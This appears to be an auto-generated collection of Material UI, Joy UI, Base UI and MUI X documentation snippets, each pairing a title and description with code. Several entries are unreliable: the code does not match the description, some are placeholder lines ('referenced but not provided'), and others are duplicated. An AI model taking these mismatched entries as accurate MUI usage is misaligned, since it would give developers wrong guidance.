DESCRIPTION: Shows how to create a generic custom component that can accept any React component, including built-in components, with proper TypeScript typing.

LANGUAGE: ts
CODE:
function GenericCustomComponent<C extends React.ElementType>(
  props: TypographyProps<C, { component?: C }>,
) {
  /* ... */
}

----------------------------------------

TITLE: Implementing Indeterminate Checkbox in React
DESCRIPTION: This code example shows how to implement an indeterminate checkbox in React using Material-UI. It includes the usage of the 'indeterminateIcon' prop to customize the indeterminate state icon.

LANGUAGE: JSX
CODE:
{"demo": "IndeterminateCheckbox.js"}

----------------------------------------

TITLE: Implementing Icon Avatars in React MUI
DESCRIPTION: Icon avatars are created by passing an icon component as children to the Avatar component.

LANGUAGE: JSX
CODE:
IconAvatars.js referenced but not provided in the input text

----------------------------------------

TITLE: Importing Roboto Font Weights in React
DESCRIPTION: TypeScript/React code to import specific weights of the Roboto font into a project.

LANGUAGE: tsx
CODE:
import '@fontsource/roboto/300.css';
import '@fontsource/roboto/400.css';
import '@fontsource/roboto/500.css';
import '@fontsource/roboto/700.css';

----------------------------------------

TITLE: Implementing Autocomplete Component in React
DESCRIPTION: This snippet demonstrates the use of the useAutocomplete hook in React to create an Autocomplete component. The hook provides functionality for combo box behavior and is part of MUI's component library.

LANGUAGE: jsx
CODE:
<video autoplay muted loop playsinline width="382" height="408">
  <source src="/static/blog/2020-q1-update/autocomplete.mp4" type="video/mp4" />
</video>

----------------------------------------

TITLE: Importing Tabs Components in React
DESCRIPTION: Import statements for the main Tabs-related components from Joy UI. These components are used to create a tabbed interface.

LANGUAGE: jsx
CODE:
import Tabs from '@mui/joy/Tabs';
import TabList from '@mui/joy/TabList';
import Tab from '@mui/joy/Tab';

----------------------------------------

TITLE: Importing Focus Trap Component in React
DESCRIPTION: This snippet shows how to import the FocusTrap component from the @mui/base package.

LANGUAGE: jsx
CODE:
import { FocusTrap } from '@mui/base/FocusTrap';

----------------------------------------

TITLE: Migrating Font Icon Component
DESCRIPTION: Diff showing the changes required to migrate the Font Icon component from v0.x to v1.x.

LANGUAGE: diff
CODE:
-import FontIcon from 'material-ui/FontIcon';
+import Icon from '@material-ui/core/Icon';

-<FontIcon>home</FontIcon>
+<Icon>home</Icon>

----------------------------------------

TITLE: Refactoring nested class selectors in theme styleOverrides
DESCRIPTION: Replace nested class selectors with global class names in theme styleOverrides.

LANGUAGE: diff
CODE:
 const theme = createTheme({
   components: {
     MuiOutlinedInput: {
       styleOverrides: {
         root: {
-          '& $notchedOutline': {
+          '& .MuiOutlinedInput-notchedOutline': {
             borderWidth: 1,
           }
         }
       }
     }
   }
 });

----------------------------------------

TITLE: Implementing Basic Theme Scoping with Material UI
DESCRIPTION: Demonstrates how to set up theme scoping with Material UI's ThemeProvider and another UI library. Uses THEME_ID to isolate Material UI's theme from other styling solutions.

LANGUAGE: javascript
CODE:
import { ThemeProvider, THEME_ID, createTheme } from '@mui/material/styles';
import { AnotherThemeProvider } from 'another-ui-library';

const materialTheme = createTheme(/* your theme */);

function App() {
  return (
    <AnotherThemeProvider>
      <ThemeProvider theme={{ [THEME_ID]: materialTheme }}>
        {/* components from another library and Material UI */}
      </ThemeProvider>
    </AnotherThemeProvider>
  );
}

----------------------------------------

TITLE: Importing Portal Component in React
DESCRIPTION: Shows how to import the Portal component from MUI Base UI. This component allows rendering children into a DOM node outside of the Portal's own DOM hierarchy.

LANGUAGE: jsx
CODE:
import { Portal } from '@mui/base/Portal';

----------------------------------------

TITLE: Running Local Codemod Transformation in JavaScript
DESCRIPTION: This snippet demonstrates how to run a local transformation for testing a codemod during development. It uses the 'accordion-props' codemod as an example.

LANGUAGE: bash
CODE:
node packages/mui-codemod/codemod deprecations/accordion-props packages/mui-codemod/src/deprecations/accordion-props/test-cases/theme.actual.js

----------------------------------------

TITLE: Importing Menu Component for Visual Regression Test in JavaScript
DESCRIPTION: This snippet demonstrates how to import and use a Menu component for visual regression testing. It shows the structure of a simple test fixture as a React component.

LANGUAGE: javascript
CODE:
import * as React from 'react';
import Menu from '@mui/material/Menu';
import MenuItem from '@mui/material/MenuItem';

export default function SimpleMenu() {
  return (
    <Menu open anchorEl={document.body}>
      <MenuItem>Profile</MenuItem>
      <MenuItem>My account</MenuItem>
      <MenuItem>Logout</MenuItem>
    </Menu>
  );
}

----------------------------------------

TITLE: Applying Custom Props to Select Component Slots
DESCRIPTION: Demonstration of using the slotProps prop to pass custom props to internal slots of the Select component.

LANGUAGE: jsx
CODE:
<Select slotProps={{ listbox: { className: 'my-listbox' } }} />

----------------------------------------

TITLE: Defining Virtual Element Interface for Popover in TypeScript
DESCRIPTION: This snippet defines the TypeScript interface for a virtual element that can be used as an anchor for the Popover component. It specifies the required properties and their types.

LANGUAGE: typescript
CODE:
interface PopoverVirtualElement {
  nodeType: 1;
  getBoundingClientRect: () => DOMRect;
}

----------------------------------------

TITLE: Server-Side Media Query Implementation
DESCRIPTION: Server-side implementation of useMediaQuery with user agent detection and matchMedia emulation.

LANGUAGE: js
CODE:
import * as ReactDOMServer from 'react-dom/server';
import parser from 'ua-parser-js';
import mediaQuery from 'css-mediaquery';
import { createTheme, ThemeProvider } from '@mui/material/styles';

function handleRender(req, res) {
  const deviceType = parser(req.headers['user-agent']).device.type || 'desktop';
  const ssrMatchMedia = (query) => ({
    matches: mediaQuery.match(query, {
      width: deviceType === 'mobile' ? '0px' : '1024px',
    }),
  });

  const theme = createTheme({
    components: {
      MuiUseMediaQuery: {
        defaultProps: {
          ssrMatchMedia,
        },
      },
    },
  });

  const html = ReactDOMServer.renderToString(
    <ThemeProvider theme={theme}>
      <App />
    </ThemeProvider>,
  );
}

----------------------------------------

TITLE: Fixing Vertical Slider Accessibility in Chrome
DESCRIPTION: CSS fix for Chrome versions below 124 that incorrectly implement aria-orientation for vertical sliders. This solution uses -webkit-appearance but may cause console warnings in newer Chrome versions.

LANGUAGE: CSS
CODE:
.MuiSlider-thumb input {
  -webkit-appearance: slider-vertical;
}

----------------------------------------

TITLE: Grid Width Calculation Using CSS Variables
DESCRIPTION: Demonstrates how Grid v2 calculates width using CSS variables instead of React context

LANGUAGE: javascript
CODE:
{
  // --Grid-columns is defined in the grid container
  width: `calc(100% * ${value} / var(--Grid-columns))`,
}

----------------------------------------

TITLE: Customizing Timeline Colors in React
DESCRIPTION: Shows how to apply different colors from the theme palette to the TimelineDot component.

LANGUAGE: jsx
CODE:
{"demo": "ColorsTimeline.js"}

----------------------------------------

TITLE: Removing Deprecated Typography Variant
DESCRIPTION: Remove the useNextVariants option from the theme creation as it's no longer needed in v4.

LANGUAGE: diff
CODE:
 typography: {
-  useNextVariants: true,
 },

----------------------------------------

TITLE: Experimental PageContainer Implementation with Breadcrumbs
DESCRIPTION: Demonstrates the usage of PageContainer component from @toolpad/core for creating navigation-aware dashboard layouts with breadcrumbs and page title functionality.

LANGUAGE: JSX
CODE:
demo: "PageContainerBasic.js", "height": 400, "bg": "inline", "defaultExpanded": false

----------------------------------------

TITLE: Generating CSP Nonce with UUID
DESCRIPTION: JavaScript code to generate a secure nonce using UUID v4 for CSP implementation

LANGUAGE: javascript
CODE:
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');

----------------------------------------

TITLE: Using Portal Component with Server-Side Rendering in React
DESCRIPTION: Demonstrates how to use the Portal component with server-side rendering by utilizing the container prop callback. This approach is necessary when the DOM API is not available on the server.

LANGUAGE: jsx
CODE:
<Portal container={() => document.getElementById('filter-panel')!}>
  <Child />
</Portal>

----------------------------------------

TITLE: Configuring Minimum Height for TextareaAutosize
DESCRIPTION: Example showing how to set a minimum height for the TextareaAutosize component using the minRows prop.

LANGUAGE: jsx
CODE:
{"demo": "MinHeightTextarea.js"}

----------------------------------------

TITLE: Installing Material UI Pigment CSS Example
DESCRIPTION: Commands to download and extract the example project from the Material UI repository containing the Pigment CSS and Vite integration example.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/material-ui-pigment-css-vite-ts
cd material-ui-pigment-css-vite-ts

----------------------------------------

TITLE: Running Full Visual Regression Test Suite
DESCRIPTION: This command executes a full run of the visual regression test suite.

LANGUAGE: bash
CODE:
pnpm test:regressions

----------------------------------------

TITLE: Styling with sx prop in MUI X v5
DESCRIPTION: Demonstrates using the sx prop for styling GridToolbarContainer in MUI X v5, utilizing the theme spacing system

LANGUAGE: jsx
CODE:
function MyCustomToolbar() {
  // means "padding: theme.spacing(5)", NOT "5px"
  return (
    <GridToolbarContainer sx={{ p: 5 }}>My custom toolbar</GridToolbarContainer>
  );
}

export default function App() {
  return (
    <div style={{ height: 400, width: '100%' }}>
      <DataGrid components={{ Toolbar: MyCustomToolbar }} />
    </div>
  );
}

----------------------------------------

TITLE: Rendering an Array of React Chips
DESCRIPTION: Shows how to render multiple Chip components from an array of values, including deletion functionality.

LANGUAGE: JSX
CODE:
{"demo": "ChipsArray.js"}

----------------------------------------

TITLE: Setting CSP Header with Nonce
DESCRIPTION: Example of setting a Content Security Policy header with a nonce value

LANGUAGE: javascript
CODE:
header('Content-Security-Policy').set(
  `default-src 'self'; style-src 'self' 'nonce-${nonce}';`,
);

----------------------------------------

TITLE: Using Portal Component with Server-Side Rendering
DESCRIPTION: Demonstrates how to use the Portal component with server-side rendering. It uses a callback for the container prop to ensure compatibility with server-side environments where DOM API is not available.

LANGUAGE: jsx
CODE:
<Portal container={() => document.getElementById('filter-panel')!}>
  <Child />
</Portal>

----------------------------------------

TITLE: TypeScript Declaration for Typography Overrides in Joy UI
DESCRIPTION: TypeScript type declarations for customizing the typography system by excluding default levels.

LANGUAGE: ts
CODE:
declare module '@mui/joy/styles' {
  interface TypographySystemOverrides {
    'title-sm': false;
    'title-xs': false;
  }
}

----------------------------------------

TITLE: Triggering CircleCI Pipeline for Bundling Workflow
DESCRIPTION: This curl command triggers a run of the bundling workflow in CircleCI for a specific Pull Request. It requires a CircleCI API token to be set as an environment variable.

LANGUAGE: bash
CODE:
curl --request POST \
  --url https://circleci.com/api/v2/project/gh/mui/material-ui/pipeline \
  --header 'content-type: application/json' \
  --header 'Circle-Token: $CIRCLE_TOKEN' \
  --data-raw '{"branch":"pull/24289/head","parameters":{"workflow":"bundling"}}'

----------------------------------------

TITLE: Creating Form Input Fields
DESCRIPTION: Implementation of form controls with labels and input fields for email and password entry.

LANGUAGE: jsx
CODE:
<FormControl>
  <FormLabel>Email</FormLabel>
  <Input
    name="email"
    type="email"
    placeholder="johndoe@email.com"
  />
</FormControl>
<FormControl>
  <FormLabel>Password</FormLabel>
  <Input
    name="password"
    type="password"
    placeholder="password"
  />
</FormControl>

----------------------------------------

TITLE: Customizing Default Shadows in Joy UI
DESCRIPTION: Example of how to override default shadow tokens in the Joy UI theme using extendTheme. Demonstrates setting custom CSS box-shadow values for different size variants.

LANGUAGE: javascript
CODE:
import { extendTheme } from '@mui/joy/styles';

const theme = extendTheme({
  shadow: {
    xs: '{CSS box-shadow}',
    sm: '{CSS box-shadow}',
    md: '{CSS box-shadow}',
    lg: '{CSS box-shadow}',
    xl: '{CSS box-shadow}',
  },
});

----------------------------------------

TITLE: Custom Numeric Spacing Configuration
DESCRIPTION: Shows how to configure theme spacing with a custom numeric value multiplier

LANGUAGE: javascript
CODE:
const theme = createTheme({
  spacing: 4,
});

theme.spacing(2); // `${4 * 2}px` = '8px'

----------------------------------------

TITLE: Importing TextareaAutosize in React
DESCRIPTION: Shows how to import the TextareaAutosize component from the Material-UI library.

LANGUAGE: jsx
CODE:
import TextareaAutosize from '@mui/material/TextareaAutosize';

----------------------------------------

TITLE: Customizing Select Component Slots in React
DESCRIPTION: Example of using the slots prop to override the root and listbox elements of the Select component.

LANGUAGE: jsx
CODE:
<Select slots={{ root: 'div', listbox: 'ol' }} />

----------------------------------------

TITLE: Using Button Icon Props in React MUI
DESCRIPTION: Demonstrates how to use the new startIcon prop to add an icon to a Material-UI Button component. This new prop simplifies the process of appending icons to buttons.

LANGUAGE: jsx
CODE:
import DeleteIcon from '@mui/icons-material/Delete';

<Button startIcon={<DeleteIcon />}>Delete</Button>;

----------------------------------------

TITLE: Importing TextareaAutosize in React
DESCRIPTION: Shows how to import the TextareaAutosize component from the Material-UI library.

LANGUAGE: jsx
CODE:
import TextareaAutosize from '@mui/material/TextareaAutosize';

----------------------------------------

TITLE: Importing Basic Card Components in React
DESCRIPTION: Basic imports required to use the Card and CardContent components from Material-UI.

LANGUAGE: jsx
CODE:
import Card from '@mui/material/Card';
import CardContent from '@mui/material/CardContent';

----------------------------------------

TITLE: Adding Roboto Font via Google Web Fonts CDN
DESCRIPTION: HTML code to include the Roboto font from Google Web Fonts CDN in a project.

LANGUAGE: html
CODE:
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  rel="stylesheet"
  href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap"
/>

----------------------------------------

TITLE: Configuring Default Robot Access Rules
DESCRIPTION: Defines the default access rules for web crawlers using the standard robots.txt format. This configuration allows unrestricted access to all web crawlers by setting no disallow rules.

LANGUAGE: robotstxt
CODE:
# https://www.robotstxt.org/robotstxt.html
User-agent: *
Disallow:

----------------------------------------

TITLE: Importing useBadge Hook
DESCRIPTION: Basic import statement for the useBadge hook from MUI Base.

LANGUAGE: jsx
CODE:
import { useBadge } from '@mui/base/useBadge';

----------------------------------------

TITLE: MUI Grid System API Import
DESCRIPTION: API documentation showing grid-related imports and their corresponding CSS properties

LANGUAGE: js
CODE:
import { grid } from '@mui/system';

----------------------------------------

TITLE: Setting Fixed Spacing in React Masonry
DESCRIPTION: Illustrates how to use the 'spacing' prop to set fixed spacing between items in a Masonry layout.

LANGUAGE: jsx
CODE:
{"demo": "FixedSpacing.js", "bg": true}

----------------------------------------

TITLE: Removing Typography Levels in Joy UI Theme
DESCRIPTION: Shows how to remove default typography levels from the theme configuration.

LANGUAGE: js
CODE:
const customTheme = extendTheme({
  typography: {
    'title-sm': undefined,
    'title-xs': undefined,
  },
});

----------------------------------------

TITLE: Configuring robots.txt for MUI Project
DESCRIPTION: This snippet configures the robots.txt file for the MUI project. It allows all user agents to access all pages of the website without any restrictions.

LANGUAGE: robotstxt
CODE:
# https://www.robotstxt.org/robotstxt.html
User-agent: *
Disallow:

----------------------------------------

TITLE: Updating ThemeProvider import
DESCRIPTION: Replace ThemeProvider import from @mui/styles with the one from @mui/material/styles.

LANGUAGE: diff
CODE:
-import { ThemeProvider } from '@mui/styles';
+import { ThemeProvider } from '@mui/material/styles';

----------------------------------------

TITLE: Box Component System Props Example
DESCRIPTION: Demonstrates usage of MUI System properties directly as props on the Box component.

LANGUAGE: jsx
CODE:
import Box from '@mui/joy/Box';

----------------------------------------

TITLE: Initializing CssVarsProvider in React
DESCRIPTION: This snippet demonstrates how to wrap an app with the CssVarsProvider utility to enable CSS variable usage in Joy UI.

LANGUAGE: jsx
CODE:
import { CssVarsProvider } from '@mui/joy/styles';

function App() {
  return <CssVarsProvider>...</CssVarsProvider>;
}

----------------------------------------

TITLE: Updating SvgIcon Props
DESCRIPTION: Rename the nativeColor prop to htmlColor for SvgIcon component.

LANGUAGE: diff
CODE:
-<AddIcon nativeColor="#fff" />
+<AddIcon htmlColor="#fff" />

----------------------------------------

TITLE: RichTreeView Component Usage in React
DESCRIPTION: Demonstrates how to use the new RichTreeView component with a dataset to render a tree structure. The component handles most complexities internally, simplifying the development process.

LANGUAGE: jsx
CODE:
const myDataSet = [
  {
    id: 'node-1',
    label: 'Node 1',
    children: [
      { id: 'node-1-1', label: 'Node 1.1' },
      { id: 'node-1-2', label: 'Node 1.2' },
    ],
  },
  {
    id: 'node-2',
    label: 'Node 2',
  },
];

LANGUAGE: jsx
CODE:
<RichTreeView items={myDataSet} multiSelect />

----------------------------------------

TITLE: Icon Import Comparison
DESCRIPTION: Shows the performance difference between named and default imports for Material UI icons.

LANGUAGE: javascript
CODE:
// 🐌 Named
import { Delete } from '@mui/icons-material';

LANGUAGE: javascript
CODE:
// 🚀 Default
import Delete from '@mui/icons-material/Delete';

----------------------------------------

TITLE: Running Material UI Next.js Project
DESCRIPTION: Commands to install dependencies and start the development server for the Material UI Next.js project.

LANGUAGE: bash
CODE:
npm install
npm run dev

----------------------------------------

TITLE: Implementing Pagination Component in React
DESCRIPTION: This snippet demonstrates the usage of the new Pagination component in React. The Pagination component allows for easy navigation through multi-page content.

LANGUAGE: jsx
CODE:
<img src="/static/blog/2020-q1-update/pagination.png" alt="pagination" style="max-height: 208px; margin-bottom: 8px;" />

----------------------------------------

TITLE: Importing Display Utilities from MUI System in JavaScript
DESCRIPTION: Shows how to import display-related utilities from the MUI system. This snippet is part of the API documentation for display utilities.

LANGUAGE: js
CODE:
import { display } from '@mui/system';

----------------------------------------

TITLE: Theming with ThemeProvider in React
DESCRIPTION: Demonstrates how to use ThemeProvider to pass a theme down the React component tree, allowing access to theme variables in style functions.

LANGUAGE: jsx
CODE:
import { ThemeProvider } from '@mui/styles';
import DeepChild from './my_components/DeepChild';

const theme = {
  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',
};

function Theming() {
  return (
    <ThemeProvider theme={theme}>
      <DeepChild />
    </ThemeProvider>
  );
}

----------------------------------------

TITLE: Half Rating Implementation with Precision
DESCRIPTION: Shows how to implement ratings with decimal values using the precision prop.

LANGUAGE: JavaScript
CODE:
HalfRating.js

----------------------------------------

TITLE: Using Hook API for Styling in React
DESCRIPTION: Demonstrates how to use the makeStyles hook to create and apply styles to a Material UI Button component.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import { makeStyles } from '@mui/styles';
import Button from '@mui/material/Button';

const useStyles = makeStyles({
  root: {
    background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',
    border: 0,
    borderRadius: 3,
    boxShadow: '0 3px 5px 2px rgba(255, 105, 135, .3)',
    color: 'white',
    height: 48,
    padding: '0 30px',
  },
});

export default function Hook() {
  const classes = useStyles();
  return <Button className={classes.root}>Hook</Button>;
}

----------------------------------------

TITLE: Configuring Global Theme Link with React Router in TypeScript
DESCRIPTION: This snippet demonstrates how to configure a global theme Link component using react-router in a TypeScript environment. It creates a custom LinkBehavior component and applies it to MuiLink and MuiButtonBase in the theme configuration.

LANGUAGE: tsx
CODE:
import { Link as RouterLink, LinkProps as RouterLinkProps } from 'react-router';
import { LinkProps } from '@mui/material/Link';

const LinkBehavior = React.forwardRef<
  HTMLAnchorElement,
  Omit<RouterLinkProps, 'to'> & { href: RouterLinkProps['to'] }
>((props, ref) => {
  const { href, ...other } = props;
  // Map href (Material UI) -> to (react-router)
  return <RouterLink ref={ref} to={href} {...other} />;
});

const theme = createTheme({
  components: {
    MuiLink: {
      defaultProps: {
        component: LinkBehavior,
      } as LinkProps,
    },
    MuiButtonBase: {
      defaultProps: {
        LinkComponent: LinkBehavior,
      },
    },
  },
});

----------------------------------------

TITLE: Enabling Copy and Paste in Data Grid
DESCRIPTION: This example demonstrates how to enable the copy and paste functionality in the MUI X Data Grid. It uses the 'experimentalFeatures' prop to activate the clipboard paste feature.

LANGUAGE: TSX
CODE:
<DataGrid
  experimentalFeatures={{ clipboardPaste: true }}
  // ... other props
/>

----------------------------------------

TITLE: Basic Usage of No-SSR Component in React
DESCRIPTION: This example demonstrates the basic usage of the No-SSR component. The component inside NoSsr will only be rendered on the client side, not on the server.

LANGUAGE: jsx
CODE:
{"demo": "SimpleNoSsr.js"}

----------------------------------------

TITLE: TypeScript module augmentation for font size
DESCRIPTION: TypeScript code to add the old font size scale to the theme's type via module augmentation.

LANGUAGE: typescript
CODE:
// You can put this to any file that's included in your tsconfig
declare module '@mui/joy/styles' {
  interface FontSizeOverrides {
    xl7: true;
    xl6: true;
    xl5: true;
    xs2: true;
    xs3: true;
  }
}

----------------------------------------

TITLE: Importing RadioGroup Component in React
DESCRIPTION: This snippet demonstrates how to import the RadioGroup component from Joy UI. RadioGroup is used to wrap multiple Radio components for better grouping and keyboard navigation.

LANGUAGE: jsx
CODE:
import RadioGroup from '@mui/joy/RadioGroup';

----------------------------------------

TITLE: Updating InputLabel Size Prop
DESCRIPTION: Run the codemod to update InputLabel size prop from 'normal' to 'medium' for consistency with other components.

LANGUAGE: bash
CODE:
npx @mui/codemod@next v7.0.0/input-label-size-normal-medium <path/to/folder>

----------------------------------------

TITLE: Implementing Automatic Activation for Tabs
DESCRIPTION: This snippet shows how to enable automatic activation for Tabs, where selection follows focus, using the selectionFollowsFocus prop.

LANGUAGE: jsx
CODE:
/* Tabs where selection follows focus */
<Tabs selectionFollowsFocus />

----------------------------------------

TITLE: Short-hand Syntax for CSS Variables in Joy UI
DESCRIPTION: This example shows a short-hand syntax for resolving values from theme.vars.* when using the sx prop.

LANGUAGE: js
CODE:
<Chip
  sx={{
    border: '1px solid',

    // For color properties, lookup from `theme.vars.palette`
    color: 'neutral.800', // 'var(--joy-palette-neutral-800)'
    borderColor: 'neutral.400', // 'var(--joy-palette-neutral-400)'

    // lookup from `theme.vars.shadow`
    shadow: 'sm', // 'var(--joy-shadow-sm)'

    // lookup from `theme.vars.fontSize`
    fontSize: 'sm', // 'var(--joy-fontSize-sm)'
  }}
/>

----------------------------------------

TITLE: Rows Per Page Options Configuration - React/JSX
DESCRIPTION: Examples of configuring the rows per page options using numbers and objects with custom labels.

LANGUAGE: jsx
CODE:
<TablePagination rowsPerPageOptions={[10, 50]} />

LANGUAGE: jsx
CODE:
<TablePagination rowsPerPageOptions={[10, 50, { value: -1, label: 'All' }]} />

----------------------------------------

TITLE: Blog Post Front Matter in Markdown
DESCRIPTION: YAML front matter metadata for the blog post including title, description, date, authors and tags.

LANGUAGE: markdown
CODE:
---
title: Introducing Material UI for Sketch
description: Today, we're excited to announce the introduction of official Sketch symbols for Material UI.
date: 2020-03-30T00:00:00.000Z
authors: ['oliviertassinari']
tags: ['Material UI', 'Product']
manualCard: true
---

----------------------------------------

TITLE: Importing Typography Component in React
DESCRIPTION: Basic import statement for the Typography component from MUI Joy.

LANGUAGE: jsx
CODE:
import Typography from '@mui/joy/Typography';

----------------------------------------

TITLE: Importing and Using Switch Component in React
DESCRIPTION: Basic example of importing and using the Switch component from Joy UI in a React application.

LANGUAGE: jsx
CODE:
import Switch from '@mui/joy/Switch';

export default function MyApp() {
  return <Switch />;
}

----------------------------------------

TITLE: Updating Button with Loading State Import
DESCRIPTION: Example of updating the import for the Button component with loading state.

LANGUAGE: diff
CODE:
-import { LoadingButton } from '@mui/lab';
+import { Button } from '@mui/material';

LANGUAGE: diff
CODE:
-import LoadingButton from '@mui/lab/LoadingButton';
+import Button from '@mui/material/Button';

----------------------------------------

TITLE: Configuring Webpack for MUI System v7 Modern Bundle
DESCRIPTION: This code snippet shows how to configure Webpack to use the 'mui-modern' exports condition for smaller bundle size in MUI System v7.

LANGUAGE: js
CODE:
// webpack.config.js
{
  resolve: {
    conditionNames: ['mui-modern', '...'],
  }
}

----------------------------------------

TITLE: Importing Unstyled Modal from MUI Base
DESCRIPTION: This code snippet illustrates how to import the ModalUnstyled component from MUI Base.

LANGUAGE: JavaScript
CODE:
import { ModalUnstyled } from '@mui/base/ModalUnstyled';

----------------------------------------

TITLE: Importing Select and Option Components in React
DESCRIPTION: Basic import statements for using the Select and Option components from MUI Base.

LANGUAGE: jsx
CODE:
import { Select } from '@mui/base/Select';
import { Option } from '@mui/base/Option';

----------------------------------------

TITLE: Importing Number Input Component in React
DESCRIPTION: This snippet shows how to import the Number Input component from MUI Base.

LANGUAGE: jsx
CODE:
import { Unstable_NumberInput as NumberInput } from '@mui/base/Unstable_NumberInput';

----------------------------------------

TITLE: Installing MUI Styles Package via NPM
DESCRIPTION: Command to install the @mui/styles package using npm package manager. Note that this is a legacy package and not recommended for new projects.

LANGUAGE: bash
CODE:
npm install @mui/styles

----------------------------------------

TITLE: App Implementation with Theme Toggle
DESCRIPTION: Example of implementing the CssVarsProvider and theme toggle functionality in a React application using the useColorScheme hook.

LANGUAGE: javascript
CODE:
function App() {
  const { setMode, mode } = useColorScheme();
  const toggleMode = () => {
    setMode(mode === 'dark' ? 'light' : 'dark');
  };

  return (
    <div>
      <h1>Current Mode: {mode}</h1>
      <Button onClick={toggleMode}>Toggle Mode</Button>
    </div>
  );
}

import * as React from 'react';
import * as ReactDOM from 'react-dom/client';
import App from './App';
import { CssVarsProvider } from './CssVarsProvider';

ReactDOM.createRoot(document.getElementById('root')).render(
  <CssVarsProvider>
    <App />
  </CssVarsProvider>,
);

----------------------------------------

TITLE: Importing No-SSR Component in React
DESCRIPTION: This snippet shows how to import the No-SSR component from MUI Base UI. The No-SSR component is used to prevent its children from being rendered on the server.

LANGUAGE: jsx
CODE:
import { NoSsr } from '@mui/base/NoSsr';

----------------------------------------

TITLE: Adjusting Sizes of React Chips
DESCRIPTION: Shows how to create small-sized Chip components using the size prop.

LANGUAGE: JSX
CODE:
{"demo": "SizesChips.js"}

----------------------------------------

TITLE: Removing Default CSS Variable Prefix in Joy UI
DESCRIPTION: This example demonstrates how to remove the default 'joy' prefix from generated CSS variables in Joy UI.

LANGUAGE: jsx
CODE:
import { CssVarsProvider, extendTheme } from '@mui/joy/styles';

function App() {
  return (
    <CssVarsProvider theme={extendTheme({ cssVarPrefix: '' })}>...</CssVarsProvider>
  );
}

----------------------------------------

TITLE: Installing Material UI Core v4 using npm or yarn
DESCRIPTION: Command-line instructions for installing @material-ui/core v4 using npm or yarn package managers.

LANGUAGE: bash
CODE:
npm install @material-ui/core

or

yarn add @material-ui/core

----------------------------------------

TITLE: Markdown Job Description
DESCRIPTION: Full job posting formatted in Markdown, including role details, company information, responsibilities, and requirements for a Staff UI Engineer position.

LANGUAGE: markdown
CODE:
# Staff UI Engineer — Base UI

<p class="description">Research, build, document, and ship high-quality, unstyled UI components with a focus on a11y.</p>

## Details of the role

- **Location**: Remote (preference for UTC-6 to UTC+5).
- **Type of work**: Full-time (contractor or employee [depending on circumstances](https://mui-org.notion.site/Hiring-FAQ-64763b756ae44c37b47b081f98915501#494af1f358794028beb4b7697b5d3102)).
- **Level**: [IC5 or above](https://mui-org.notion.site/Leveling-at-MUI-5c30f9bfe65149d697f346447cef9db1).

----------------------------------------

TITLE: Implementing Title Bar Below Image in Masonry Layout
DESCRIPTION: This code example demonstrates how to add a title bar below each image in a masonry layout image list using Material-UI components.

LANGUAGE: JSX
CODE:
{"demo": "TitlebarBelowMasonryImageList.js"}

----------------------------------------

TITLE: Using Custom Link Component in Next.js
DESCRIPTION: This snippet shows how to use a custom Link component in a Next.js application. The Link component is a styled version that combines Material UI Link with NextLinkComposed.

LANGUAGE: tsx
CODE:
import Link from '../src/Link';

export default function Index() {
  return (
    <Link
      href={{
        pathname: '/about',
        query: { name: 'test' },
      }}
    >
      Link
    </Link>
  );
}

----------------------------------------

TITLE: Importing Date-fns Adapters in React Date Pickers
DESCRIPTION: Shows how to import date-fns adapters for both v2 and v3 versions in MUI X Date and Time Pickers. This allows developers to choose their preferred date-fns version.

LANGUAGE: javascript
CODE:
// date-fns v2.x
import { AdapterDateFns } from '@mui/x-date-pickers/AdapterDateFns';

// date-fns v3.x
import { AdapterDateFns } from '@mui/x-date-pickers/AdapterDateFnsV3';

----------------------------------------

TITLE: Importing Portal from MUI Base
DESCRIPTION: This code snippet illustrates how to import the Portal component from MUI Base.

LANGUAGE: JavaScript
CODE:
import { Portal } from '@mui/base/Portal';

----------------------------------------

TITLE: Importing Click-Away Listener in React
DESCRIPTION: Basic import statement for the Click-Away Listener component from Material-UI.

LANGUAGE: jsx
CODE:
import ClickAwayListener from '@mui/material/ClickAwayListener';

----------------------------------------

TITLE: Enum Props Type Definition in TypeScript
DESCRIPTION: Example showing how to define enum prop types for component variations

LANGUAGE: tsx
CODE:
type Props = {
  variant: 'text' | 'contained' | 'fab';
};

----------------------------------------

TITLE: Importing useSnackbar Hook in React
DESCRIPTION: Shows how to import the useSnackbar hook from MUI Base UI for creating custom Snackbar functionality.

LANGUAGE: js
CODE:
import { useSnackbar } from '@mui/base/useSnackbar';

----------------------------------------

TITLE: Installing Material UI Icons with npm
DESCRIPTION: Command to install Material UI Icons and Material UI packages using npm. Includes webpack and TypeScript configuration for aliasing.

LANGUAGE: bash
CODE:
npm install @mui/icons-material @mui/material

LANGUAGE: diff
CODE:
 module.exports = {
   //...
+  resolve: {
+    alias: {
+      '@mui/material': '@mui/joy',
+    },
+  },
 };

LANGUAGE: diff
CODE:
 {
   "compilerOptions": {
+    "paths": {
+      "@mui/material": ["./node_modules/@mui/joy"]
+    }
   }
 }

----------------------------------------

TITLE: Styled Button Component Using CSS Variables
DESCRIPTION: Example of a styled button component utilizing the CSS theme variables for dynamic theming based on the current color scheme.

LANGUAGE: javascript
CODE:
import { styled } from '@mui/system';

const Button = styled('button')(({ theme }) => ({
  backgroundColor: theme.vars.palette.primary.default,
  border: `1px solid ${theme.vars.palette.primary.dark}`,
  color: theme.vars.palette.text.default,
}));

export default Button;

----------------------------------------

TITLE: Running Codemod for Tree View Migration in Bash
DESCRIPTION: This command runs a codemod to automatically migrate Tree View imports from @mui/lab to @mui/x-tree-view across a codebase. It uses npx to execute the codemod without installation.

LANGUAGE: bash
CODE:
npx @mui/codemod@latest v5.0.0/tree-view-moved-to-x <path>

----------------------------------------

TITLE: Importing Unstyled Autocomplete from MUI Base
DESCRIPTION: This code snippet demonstrates how to import the useAutocomplete hook from the unstyled Autocomplete component in MUI Base.

LANGUAGE: JavaScript
CODE:
import { useAutocomplete } from '@mui/base/AutocompleteUnstyled';

----------------------------------------

TITLE: TypeScript Interfaces for Joy UI Component
DESCRIPTION: Defines TypeScript interfaces for component props and ownerState to provide type safety

LANGUAGE: typescript
CODE:
interface StatProps {
  value: number | string;
